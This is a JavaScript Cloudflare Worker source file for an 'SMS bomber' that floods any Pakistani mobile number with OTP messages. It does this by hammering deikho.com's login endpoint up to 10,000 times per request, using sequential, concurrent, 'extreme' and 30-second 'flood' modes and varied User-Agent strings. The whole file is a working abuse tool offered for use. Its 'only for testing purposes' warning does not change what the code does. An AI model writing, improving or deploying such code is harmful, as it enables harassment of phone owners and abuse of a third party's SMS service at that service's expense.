// SMS Bomber API using deikho.com ONLY for ALL Pakistan Numbers
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const phone = url.searchParams.get('phone');
  const qty = parseInt(url.searchParams.get('qty')) || 10;
  const mode = url.searchParams.get('mode') || 'normal';

  // CORS headers
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Content-Type': 'application/json'
  };

  if (request.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  // Validate input
  if (!phone) {
    return new Response(
      JSON.stringify({
        status: 'error',
        message: 'Phone parameter is required',
        example: '/?phone=923271234567&qty=100&mode=fast'
      }, null, 2),
      { status: 400, headers: corsHeaders }
    );
  }

  if (qty > 10000) {
    return new Response(
      JSON.stringify({
        status: 'error',
        message: 'Maximum 10000 messages allowed'
      }, null, 2),
      { status: 400, headers: corsHeaders }
    );
  }

  // Format Pakistan phone number
  const formattedPhone = formatPakistanPhone(phone);
  if (!formattedPhone) {
    return new Response(
      JSON.stringify({
        status: 'error',
        message: 'Invalid Pakistan phone number',
        valid_formats: [
          '923001234567',
          '03001234567', 
          '3001234567',
          '03271234567',
          '3211234567'
        ],
        valid_prefixes: '0300-0399, 92300-92399'
      }, null, 2),
      { status: 400, headers: corsHeaders }
    );
  }

  try {
    const startTime = Date.now();
    
    let results;
    
    // Select bombing mode
    switch(mode) {
      case 'fast':
        results = await fastBombDeikho(formattedPhone, qty);
        break;
      case 'extreme':
        results = await extremeBombDeikho(formattedPhone, qty);
        break;
      case 'flood':
        results = await floodModeDeikho(formattedPhone, qty);
        break;
      default:
        results = await normalBombDeikho(formattedPhone, qty);
    }
    
    const totalTime = Date.now() - startTime;

    return new Response(
      JSON.stringify({
        status: 'success',
        phone: formattedPhone,
        quantity: qty,
        mode: mode,
        api_used: 'deikho.com ONLY',
        messages_sent: results.successful,
        failed: results.failed,
        success_rate: `${((results.successful / qty) * 100).toFixed(1)}%`,
        total_time: `${totalTime}ms`,
        speed: `${(qty / (totalTime / 1000)).toFixed(2)} requests/sec`,
        average_response_time: `${(totalTime / qty).toFixed(0)}ms per request`,
        results: results.details,
        timestamp: new Date().toISOString(),
        api_endpoint: 'https://deikho.com/login?phone=',
        warning: 'Use responsibly - Only for testing purposes!'
      }, null, 2),
      { headers: corsHeaders }
    );

  } catch (error) {
    return new Response(
      JSON.stringify({
        status: 'error',
        message: error.message,
        api: 'deikho.com',
        timestamp: new Date().toISOString()
      }, null, 2),
      { status: 500, headers: corsHeaders }
    );
  }
}

// Format Pakistan phone number - ACCEPTS ALL PAKISTAN NUMBERS
function formatPakistanPhone(phone) {
  // Remove all non-digits
  let cleaned = phone.replace(/\D/g, '');
  
  // Check minimum and maximum length
  if (cleaned.length < 10 || cleaned.length > 12) {
    return null;
  }
  
  // Case 1: Starts with 0 (like 03271234567, 03001234567, etc.)
  if (cleaned.startsWith('0')) {
    // Check if it's a valid Pakistan mobile number after 0
    const afterZero = cleaned.substring(1, 4); // Get next 3 digits
    const prefix = parseInt(afterZero);
    
    // ALL Pakistan mobile prefixes 300-399
    if (prefix >= 300 && prefix <= 399) {
      return '92' + cleaned.substring(1);
    }
    return null;
  }
  
  // Case 2: 10 digits (like 3271234567, 3001234567)
  if (cleaned.length === 10) {
    const prefix = parseInt(cleaned.substring(0, 3));
    // ALL Pakistan mobile prefixes 300-399
    if (prefix >= 300 && prefix <= 399) {
      return '92' + cleaned;
    }
    return null;
  }
  
  // Case 3: 12 digits starting with 92 (like 923271234567)
  if (cleaned.length === 12 && cleaned.startsWith('92')) {
    const after92 = cleaned.substring(2, 5); // Get digits after 92
    const prefix = parseInt(after92);
    
    // ALL Pakistan mobile prefixes 300-399
    if (prefix >= 300 && prefix <= 399) {
      return cleaned;
    }
    return null;
  }
  
  return null;
}

// Normal bombing mode
async function normalBombDeikho(phone, quantity) {
  const results = [];
  let successful = 0;
  let failed = 0;
  
  const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
  
  for (let i = 0; i < quantity; i++) {
    try {
      const start = Date.now();
      
      const response = await fetch(DEIKHO_API, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          'Referer': 'https://deikho.com/',
          'Origin': 'https://deikho.com',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        }
      });
      
      const responseTime = Date.now() - start;
      
      if (response.ok) {
        successful++;
        results.push({
          attempt: i + 1,
          status: 'success',
          response_time: `${responseTime}ms`,
          status_code: response.status
        });
      } else {
        failed++;
        results.push({
          attempt: i + 1,
          status: 'failed',
          status_code: response.status,
          response_time: `${responseTime}ms`
        });
      }
      
      // Small delay between requests (100ms)
      if (i < quantity - 1) {
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
    } catch (error) {
      failed++;
      results.push({
        attempt: i + 1,
        status: 'error',
        error: error.message
      });
    }
  }
  
  return {
    successful: successful,
    failed: failed,
    details: results.slice(0, 20)
  };
}

// Fast bombing mode (concurrent)
async function fastBombDeikho(phone, quantity) {
  const BATCH_SIZE = 10;
  const CONCURRENT = 5;
  const results = [];
  let totalSuccessful = 0;
  
  const batches = Math.ceil(quantity / BATCH_SIZE);
  
  for (let batch = 0; batch < batches; batch++) {
    const currentBatch = Math.min(BATCH_SIZE, quantity - (batch * BATCH_SIZE));
    
    const batchPromises = [];
    
    for (let i = 0; i < CONCURRENT && i < currentBatch; i++) {
      const requestIndex = (batch * BATCH_SIZE) + i;
      if (requestIndex >= quantity) break;
      
      batchPromises.push(
        (async () => {
          try {
            const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
            const response = await fetch(DEIKHO_API, {
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*'
              }
            });
            
            return {
              attempt: requestIndex + 1,
              success: response.ok,
              status: response.status
            };
          } catch (error) {
            return {
              attempt: requestIndex + 1,
              success: false,
              error: error.message
            };
          }
        })()
      );
    }
    
    const batchResults = await Promise.allSettled(batchPromises);
    
    batchResults.forEach(result => {
      if (result.value) {
        if (result.value.success) {
          totalSuccessful++;
        }
        results.push(result.value);
      }
    });
    
    if (batch < batches - 1) {
      await new Promise(resolve => setTimeout(resolve, 50));
    }
  }
  
  return {
    successful: totalSuccessful,
    failed: quantity - totalSuccessful,
    details: results.slice(0, 15)
  };
}

// Extreme bombing mode (maximum speed)
async function extremeBombDeikho(phone, quantity) {
  const MAX_CONCURRENT = 20;
  const results = [];
  let successful = 0;
  
  const promises = [];
  
  for (let i = 0; i < quantity; i++) {
    promises.push(
      (async (index) => {
        try {
          const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
          const response = await fetch(DEIKHO_API, {
            headers: {
              'User-Agent': `Mozilla/5.0 (Request-${index})`,
              'Accept': '*/*'
            }
          });
          
          const success = response.ok;
          if (success) successful++;
          
          return {
            attempt: index + 1,
            success: success,
            status: response.status
          };
        } catch (error) {
          return {
            attempt: index + 1,
            success: false,
            error: error.message
          };
        }
      })(i)
    );
    
    if (promises.length >= MAX_CONCURRENT || i === quantity - 1) {
      const batchResults = await Promise.allSettled(promises);
      batchResults.forEach(result => {
        if (result.value) {
          results.push(result.value);
        }
      });
      promises.length = 0;
    }
  }
  
  return {
    successful: successful,
    failed: quantity - successful,
    details: results.slice(0, 10)
  };
}

// Flood mode (continuous requests)
async function floodModeDeikho(phone, quantity) {
  const DURATION = 30000;
  const startTime = Date.now();
  const endTime = startTime + DURATION;
  
  const results = [];
  let successful = 0;
  let attempts = 0;
  
  while (Date.now() < endTime && attempts < quantity) {
    attempts++;
    
    try {
      const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
      const response = await fetch(DEIKHO_API, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Flood-Mode)',
          'Accept': '*/*'
        }
      });
      
      if (response.ok) {
        successful++;
      }
      
      if (attempts % 10 === 0) {
        results.push({
          batch: attempts / 10,
          time_elapsed: `${Date.now() - startTime}ms`,
          successful_so_far: successful,
          attempts_so_far: attempts
        });
      }
      
    } catch (error) {
      // Continue despite errors
    }
    
    if (attempts >= quantity) break;
  }
  
  const actualQuantity = Math.min(attempts, quantity);
  
  return {
    successful: successful,
    failed: actualQuantity - successful,
    details: [{
      mode: 'flood',
      duration: `${Date.now() - startTime}ms`,
      total_attempts: attempts,
      successful: successful,
      failed: attempts - successful,
      requests_per_second: (attempts / ((Date.now() - startTime) / 1000)).toFixed(2)
    }]
  };
}

// Health check endpoint
async function handleHealthRequest() {
  try {
    // Test with different Pakistan prefixes
    const testNumbers = [
      '923271234567', // Jazz
      '923351234567', // Zong
      '923451234567', // Telenor
      '923001234567'  // Ufone
    ];
    
    let working = false;
    let testedNumber = '';
    
    for (const testNum of testNumbers) {
      try {
        const DEIKHO_API = `https://deikho.com/login?phone=${testNum}`;
        const response = await fetch(DEIKHO_API, {
          headers: { 'User-Agent': 'Health-Check/1.0' }
        });
        
        if (response.ok) {
          working = true;
          testedNumber = testNum;
          break;
        }
      } catch (e) {
        continue;
      }
    }
    
    return new Response(JSON.stringify({
      status: 'online',
      service: 'Deikho.com SMS Bomber - All Pakistan Numbers',
      version: '2.0',
      deikho_status: working ? 'working' : 'maybe_down',
      tested_with: testedNumber || 'none',
      
      // All Pakistan networks support
      supported_prefixes: {
        jazz: '0300-0309, 0310-0319, 0320-0329',
        telenor: '0340-0349',
        zong: '0310-0319, 0330-0339',
        ufone: '0330-0339',
        special: '0370-0379',
        all_formats: '300-399 (all Pakistan mobile)'
      },
      
      limits: {
        max_messages: 10000,
        modes: ['normal', 'fast', 'extreme', 'flood']
      },
      
      usage_examples: [
        '/?phone=03271234567&qty=100&mode=fast',
        '/?phone=923351234567&qty=500&mode=extreme',
        '/?phone=3451234567&qty=50&mode=normal'
      ],
      
      timestamp: new Date().toISOString()
    }, null, 2), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  } catch (error) {
    return new Response(JSON.stringify({
      status: 'error',
      message: 'Deikho.com is not reachable',
      error: error.message
    }, null, 2), {
      status: 503,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

// Main fetch handler
addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  
  // Health check endpoint
  if (url.pathname === '/health' || url.pathname === '/status') {
    event.respondWith(handleHealthRequest());
    return;
  }
  
  // API info endpoint
  if (url.pathname === '/info' || url.pathname === '/') {
    event.respondWith(new Response(JSON.stringify({
      api_name: 'Deikho.com SMS Bomber - All Pakistan Numbers',
      description: 'Supports ALL Pakistan mobile numbers (300-399 prefixes)',
      
      endpoints: {
        main: '/?phone=PHONE&qty=QUANTITY&mode=MODE',
        health: '/health',
        info: '/info'
      },
      
      // ACCEPTS ALL THESE FORMATS:
      accepted_formats: [
        '923001234567',    // With 92
        '923271234567',    // Jazz
        '923451234567',    // Telenor
        '03001234567',     // With 0
        '03271234567',     // Jazz with 0
        '03451234567',     // Telenor with 0
        '3001234567',      // Without prefix
        '3271234567',      // Jazz without prefix
        '3451234567'       // Telenor without prefix
      ],
      
      // ALL PAKISTAN NETWORKS:
      pakistan_networks: {
        jazz: ['0300-0309', '0310-0319', '0320-0329'],
        telenor: ['0340-0349'],
        zong: ['0310-0319', '0330-0339'],
        ufone: ['0330-0339'],
        special_new: ['0370-0379'],
        note: 'ALL numbers from 300-399 are accepted'
      },
      
      bombing_modes: {
        normal: 'Sequential (100ms delay)',
        fast: 'Concurrent batches',
        extreme: 'Maximum speed',
        flood: '30 seconds continuous'
      },
      
      example_requests: [
        'https://your-worker.workers.dev/?phone=03271234567&qty=100',
        'https://your-worker.workers.dev/?phone=923351234567&qty=500&mode=extreme',
        'https://your-worker.workers.dev/?phone=3451234567&qty=50&mode=flood'
      ]
    }, null, 2), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    }));
    return;
  }
  
  // Handle main API request
  event.respondWith(handleRequest(event.request));
});
